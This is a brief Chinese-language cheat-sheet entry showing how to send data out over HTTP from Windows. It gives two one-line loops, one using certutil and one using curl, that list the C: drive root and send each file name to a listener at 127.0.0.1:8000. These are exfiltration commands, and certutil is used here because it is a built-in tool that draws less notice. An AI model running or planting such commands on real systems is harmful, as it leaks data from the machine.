# HTTP

**Windows**

- certutil

    使用 certutil 请求证书文件，并将下载文件重定向到 nul，无缓存、无需浏览器实现发起 http 请求
    ```bash
    for /F %x in ('dir /b c:\') do certutil -urlcache -split -f "http://127.0.0.1:8000/?result=%x" nul
    ```

- curl

    win10 等环境支持 curl
    ```bash
    for /F %x in ('dir /b c:\') do curl http://127.0.0.1:8000/%x
    ```
